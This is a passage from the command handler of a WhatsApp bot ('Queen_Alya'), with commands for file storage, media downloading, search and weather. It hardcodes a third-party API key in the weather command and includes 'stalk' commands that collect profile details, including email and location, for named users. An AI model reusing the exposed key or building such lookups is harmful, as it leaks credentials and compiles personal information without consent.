replygcalya(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!AlyaTheQueen) return AlyaStickOwner()

if (args.length < 1) return replygcalya('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipAlya.includes(teks)) return replygcalya("This name does not exist in the database")
let wanu = ZipAlya.indexOf(teks)
ZipAlya.splice(wanu, 1)
fs.writeFileSync('./AlyaMedia/database/zip.json', JSON.stringify(ZipAlya))
fs.unlinkSync(`./AlyaMedia/zip/${teks}.zip`)
replygcalya(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipAlya) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipAlya.length}*`
replygcalya(teksooooo)
}
break
case 'addapk':{
if (!AlyaTheQueen) return AlyaStickOwner()

if (args.length < 1) return replygcalya('What is the name of the apk?')
let teks = `${text}`
{
if (ApkAlya.includes(teks)) return replygcalya("This name is already in use")
let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./AlyaMedia/apk/${teks}.apk`)
fs.writeFileSync('./AlyaMedia/database/apk.json', JSON.stringify(ApkAlya))
fs.unlinkSync(delb)
replygcalya(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!AlyaTheQueen) return AlyaStickOwner()

if (args.length < 1) return replygcalya('Name of the apk?')
let teks = `${text}`
{
if (!ApkAlya.includes(teks)) return replygcalya("This name does not exist in the database")
let wanu = ApkAlya.indexOf(teks)
ApkAlya.splice(wanu, 1)
fs.writeFileSync('./AlyaMedia/database/apk.json', JSON.stringify(ApkAlya))
fs.unlinkSync(`./AlyaMedia/apk/${teks}.apk`)
replygcalya(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkAlya) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkAlya.length}`
replygcalya(teksoooooo)
}
break
case 'addpdf':{
if (!AlyaTheQueen) return AlyaStickOwner()

if (args.length < 1) return replygcalya('What is the name of the pdf')
let teks = `${text}`
{
if (DocAlya.includes(teks)) return replygcalya("This name is already in use")
let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
DocAlya.push(teks)
await fsx.copy(delb, `./AlyaMedia/doc/${teks}.pdf`)
fs.writeFileSync('./AlyaMedia/database/doc.json', JSON.stringify(DocAlya))
fs.unlinkSync(delb)
replygcalya(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!AlyaTheQueen) return AlyaStickOwner()

if (args.length < 1) return replygcalya('Enter the name')
let teks = `${text}`
{
if (!DocAlya.includes(teks)) return replygcalya("This name does not exist in the database")
let wanu = DocAlya.indexOf(teks)
DocAlya.splice(wanu, 1)
fs.writeFileSync('./AlyaMedia/database/doc.json', JSON.stringify(DocAlya))
fs.unlinkSync(`./AlyaMedia/doc/${teks}.pdf`)
replygcalya(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocAlya) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocAlya.length}*`
replygcalya(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
AlyaBotInc_dev = await getBuffer(`https://github.com/STAR-KING0/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await AlyaBotInc.sendMessage(m.chat, { audio: AlyaBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await AlyaStickWait()
let teman = pickRandom(alyachoosen)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcalya('Managed to Get One whatsappNumberrson')
}, 5000)
setTimeout(() => {
AlyaBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcalya('Reply the Message!!')
let alyaquotx= await AlyaBotInc.serializeM(await m.getQuotedObj())
if (!alyaquotx.quoted) return replygcalya('The message you are replying to is not sent by the bot')
await alyaquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcalya(`Example ${prefix+command} const alyabot = require('baileys')`)
let meg = await obfus(q)
replygcalya(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcalya('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcalya(teks)
	    }
	    break
case 'yts2': case 'ytsearch2': {
                if (!text) return replygcalya(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                AlyaBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            
            case 'yts': case 'ytsearch': {
  if (!text) return replygcalya(`*Example :* ${prefix + command} title`);
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      replygcalya('No video found');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: AlyaBotInc.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await AlyaBotInc.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replygcalya(`Error`);
  }
}
break
case 'play': {
    // Check if text is provided
    if (!text) return replygcalya(`Example: ${prefix + command} <video_url|search_query>`);

    const yts = require("youtube-yts");
    const axios = require("axios");
    const fs = require("fs");

    let anup3k;
    let isUrl = false;

    // Check if the input text is a valid URL
    try {
        new URL(text); // If this doesn't throw an error, it's a valid URL
        isUrl = true;
    } catch (error) {
        isUrl = false;
    }

    if (isUrl) {
        // If it's a valid URL, use it directly
        anup3k = { url: text, title: 'Video from URL', description: 'No description available', views: 'Unknown', ago: 'Unknown', author: { name: 'Unknown' } };
    } else {
        // If it's a query, search YouTube for the result
        let search = await yts(text);
        anup3k = search.videos[0];

        if (!anup3k) return replygcalya("No results found!");
    }

    // Create buttons and interactive message using proto.Message.InteractiveMessage
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `*Queen_Alya • YOUTUBE DOWNLOADER*

*Title :* ${anup3k.title}
*Url :* ${anup3k.url}
*Description :* ${anup3k.description || "No description available"}
*Views :* ${anup3k.views}
*Uploaded :* ${anup3k.ago}
*Author :* ${anup3k.author.name}

Choose an option below:
1. Audio (Music)
2. Video`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": `{"title":"SELECT AUDIO/VIDEO",
                                "sections":[{"title":"CHOOSE OPTION",
                                "rows":[{"header":"AUDIO 🎶",
                                "title":"1. Audio",
                                "description":"Download as MP3",
                                "id":"${prefix}1 ${anup3k.url}"},
                                {"header":"VIDEO 🎥",
                                "title":"2. Video",
                                "description":"Download as MP4",
                                "id":"${prefix}2 ${anup3k.url}"}
                                ]
                                }
                                ]
                                }`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    // Send the button message
    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

// Function for downloading audio
case '1': {
    if (!text) return replygcalya(`Example: ${prefix + command} <video_url|search_query>`);

    const yts = require("youtube-yts");
    const axios = require("axios");
    const fs = require("fs");

    let anup3k;
    let isUrl = false;

    // Check if the text is a valid URL
    try {
        new URL(text); // If this doesn't throw, it's a valid URL
        isUrl = true;
    } catch (error) {
        isUrl = false;
    }

    if (isUrl) {
        // If it's a URL, we can skip the search
        anup3k = { url: text, title: 'Video from URL', thumbnail: 'thumbnail_url_placeholder' }; // Placeholder for thumbnail
    } else {
        // Search for the video
        let search = await yts(text);
        anup3k = search.videos[0];

        if (!anup3k) return replygcalya("No results found!");
    }

    // Fetch the audio using the API
    const apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(anup3k.url)}`;
    let audioResponse;

    try {
        audioResponse = await axios.get(apiUrl);
    } catch (error) {
        console.error("Error fetching audio:", error);
        return replygcalya("Failed to download the audio. Please try again.");
    }

    // Check if the API response is successful
    if (!audioResponse.data.status) {
        return replygcalya("Failed to retrieve audio URL. Please try again.");
    }

    const mp3Url = audioResponse.data.result.mp3;

    // Download the MP3 file
    let mp3Buffer;
    try {
        const mp3DownloadResponse = await axios.get(mp3Url, { responseType: 'arraybuffer' });
        mp3Buffer = Buffer.from(mp3DownloadResponse.data);
    } catch (error) {
        console.error("Error downloading MP3:", error);
        return replygcalya("Failed to download the MP3. Please try again.");
    }

    // Send the audio message
    await AlyaBotInc.sendMessage(m.chat, {
        audio: mp3Buffer,
        fileName: anup3k.title + '.mp3',
        mimetype: 'audio/mp4',
        ptt: true,
        contextInfo: {
            externalAdReply: {
                title: anup3k.title,
                body: botname,
                thumbnail: await fetchBuffer(anup3k.thumbnail), // Use thumbnail from the search result or placeholder
                mediaType: 2,
                mediaUrl: anup3k.url,
            }
        },
    }, { quoted: m });
}
break;

// Function for downloading video
case '2': {
    if (!text) return replygcalya("Please provide a YouTube URL.");

    try {
        let anu = await axios.get(`https://widipe.com/download/ytdl?url=${text}`);
        if (!anu || anu.data.status !== true) {
            return replygcalya('Failed to fetch video details. Try again later.');
        }

        // Send the video to the user
        await AlyaBotInc.sendMessage(m.chat, {
            video: { url: anu.data.result.mp4 }
        }, { quoted: m });
    } catch (err) {
        console.error("Error fetching video:", err);
        replygcalya('An error occurred while processing the video.');
    }
}
break;
case 'git':
case 'gitclone':
    if (!args[0]) return replygcalya(`Where is the link?\nExample :\n${prefix}${command} https://github.com/STAR-KING0/Queen_Alya`);
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcalya(`Invalid link!!`);

    let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
    let [, user, repo] = args[0].match(regex) || [];
    if (!user || !repo) return replygcalya('Unable to parse GitHub link');

    repo = repo.replace(/.git$/, '');
    let apiUrl = `https://api.github.com/repos/${user}/${repo}/zipball`;

    try {
        let response = await fetch(apiUrl, { method: 'HEAD' });
        if (!response.ok) throw new Error('Failed to fetch repository');
        
        let filename = response.headers.get('content-disposition').match(/attachment; filename=(.*)/)[1];
        AlyaBotInc.sendMessage(m.chat, { 
            document: { url: apiUrl }, 
            fileName: filename + '.zip', 
            mimetype: 'application/zip' 
        }, { quoted: m }).catch((err) => replygcalya(mess.error));
    } catch (err) {
        replygcalya('Error fetching repository: ' + err.message);
    }
    break;
case 'tiktok': {
    const tiktokUrl = text; // Assuming 'text' contains the TikTok URL

    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `*Queen_Alya • TIKTOK ᴅᴏᴡɴʟᴏᴀᴅᴇʀ*

*Url :* ${tiktokUrl}

Choose an option below:
1. TikTok Video
2. TikTok Audio`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": `{"title":"SELECT TIKTOK DOWNLOAD OPTION",
                                "sections":[{"title":"CHOOSE FORMAT",
                                "rows":[{"header":"Video 🎥",
                                "title":"1. TikTok Video",
                                "description":"Download TikTok video",
                                "id":"${prefix}tiktokvideo ${tiktokUrl}"},
                                {"header":"Audio 🎶",
                                "title":"2. TikTok Audio",
                                "description":"Download TikTok audio",
                                "id":"${prefix}tiktokaudio ${tiktokUrl}"}
                                ]
                                }
                                ]
                                }`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    // Send the button message
    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

// Handle TikTok Video download
case 'tiktokvideo': {
    if (!text) return replygcalya("Please provide a valid TikTok video URL.");
    const tiktokUrl = text;

    try {
        const response = await axios.get(`https://widipe.com/download/tiktokdl?url=${encodeURIComponent(tiktokUrl)}`);
        if (!response.data.result || !response.data.result.video) {
            return replygcalya("Failed to fetch video. Please try again.");
        }

        const videoUrl = response.data.result.video; // Get video URL from the API response

        await AlyaBotInc.sendMessage(m.chat, {
            video: { url: videoUrl } // Send the video URL without a caption
        }, { quoted: m });
    } catch (error) {
        console.error("Error fetching video:", error);
        replygcalya("An error occurred while processing the video.");
    }
    break;
}

// Handle TikTok Audio download
case 'tiktokaudio': {
    if (!text) return replygcalya("Please provide a valid TikTok video URL.");
    const tiktokUrl = text;

    try {
        const response = await axios.get(`https://widipe.com/download/tiktokdl?url=${encodeURIComponent(tiktokUrl)}`);
        if (!response.data.result || !response.data.result.music) {
            return replygcalya("Failed to fetch audio. Please try again.");
        }

        const audioUrl = response.data.result.music; // Get audio URL from the API response

        await AlyaBotInc.sendMessage(m.chat, {
            audio: { url: audioUrl }, // Send the audio URL without a caption
            mimetype: 'audio/mp4',
            ptt: true
        }, { quoted: m });
    } catch (error) {
        console.error("Error fetching audio:", error);
        replygcalya("An error occurred while processing the audio.");
    }
    break;
}
case 'google': {
if (!q) return replygcalya(`Example : ${prefix + command} ${botname}`)
await AlyaStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcalya(teks)
})
}
break
case 'weather':{
if (!text) return replygcalya('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           AlyaBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
case 'fb': {
    // Check if the URL is provided
    if (!text) return replygcalya(`Example: ${prefix + command} <facebook_video_url>`);

    const fbUrl = text; // Store the provided URL
    let isValidUrl = false;

    // Check if the text is a valid URL
    try {
        new URL(fbUrl); // This checks if the URL is valid
        isValidUrl = true;
    } catch (error) {
        isValidUrl = false;
    }

    if (!isValidUrl) return replygcalya("Invalid URL. Please try again.");

    // Create the message with buttons
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `*Queen_Alya • FACEBOOK ᴅᴏᴡɴʟᴏᴀᴅᴇʀ*

*Url:* ${fbUrl}

Choose an option below:`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": `{"title":"SELECT FB DOWNLOAD OPTION",
                                "sections":[{"title":"CHOOSE FORMAT",
                                "rows":[
                                    {"header":"HD Video 🎥","title":"1. FB HD Video","description":"Download high-quality video","id":"${prefix}fbhd ${fbUrl}"},
                                    {"header":"SD Video 🎥","title":"2. FB SD Video","description":"Download standard quality video","id":"${prefix}fbsd ${fbUrl}"},
                                    {"header":"Audio 🎶","title":"3. FB Audio","description":"Download audio only","id":"${prefix}fbaudio ${fbUrl}"}
                                ]
                                }
                                ]
                                }`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    // Send the button message
    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    break;
}

// Handle FB HD Video download
case 'fbhd': {
    if (!text) return replygcalya("Please provide a valid Facebook video URL.");
    const fbUrl = text;

    try {
        const response = await axios.get(`https://itzpire.com/download/facebook?url=${encodeURIComponent(fbUrl)}`);
        if (response.data.status !== "success") {
            return replygcalya("Failed to fetch HD video. Please try again.");
        }

        await AlyaBotInc.sendMessage(m.chat, {
            video: { url: response.data.data.video_hd }
        }, { quoted: m });
    } catch (error) {
        console.error("Error fetching HD video:", error);
        replygcalya("An error occurred while processing the HD video.");
    }
    break;
}

// Handle FB SD Video download
case 'fbsd': {
    if (!text) return replygcalya("Please provide a valid Facebook video URL.");
    const fbUrl = text;

    try {
        const response = await axios.get(`https://itzpire.com/download/facebook?url=${encodeURIComponent(fbUrl)}`);
        if (response.data.status !== "success") {
            return replygcalya("Failed to fetch SD video. Please try again.");
        }

        await AlyaBotInc.sendMessage(m.chat, {
            video: { url: response.data.data.video_sd }
        }, { quoted: m });
    } catch (error) {
        console.error("Error fetching SD video:", error);
        replygcalya("An error occurred while processing the SD video.");
    }
    break;
}

// Handle FB Audio download
case 'fbaudio': {
    if (!text) return replygcalya("Please provide a valid Facebook video URL.");
    const fbUrl = text;

    try {
        const response = await axios.get(`https://itzpire.com/download/facebook?url=${encodeURIComponent(fbUrl)}`);
        if (response.data.status !== "success") {
            return replygcalya("Failed to fetch audio. Please try again.");
        }

        await AlyaBotInc.sendMessage(m.chat, {
            audio: { url: response.data.data.audio },
            mimetype: 'audio/mp4',
            ptt: true
        }, { quoted: m });
    } catch (error) {
        console.error("Error fetching audio:", error);
        replygcalya("An error occurred while processing the audio.");
    }
    break;
}
case 'tiktokstalk': {
	  if (!text) return replygcalya(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await AlyaBotInc.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'xxxigstalk': {
if (!text) return replygcalya(`Enter Instagram Username\n\nExample: ${prefix + command} star_king13`)
    let res = await fg.igStalk(text)
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await AlyaBotInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcalya(`Example ${prefix+command} STAR-KING0`)
await AlyaStickWait()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
AlyaBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygcalya(`Example ${prefix+command} alyaapi`)
await AlyaStickWait()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcalya(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return replygcalya(`Example ${prefix+command} 946716486`)
await AlyaStickWait()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
replygcalya(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!q) return replygcalya(`Example ${prefix+command} 530793138|8129`)
await AlyaStickWait()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcalya(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'spotify':{
	if (!text) return replygcalya(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return replygcalya('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return replygcalya('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return replygcalya( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
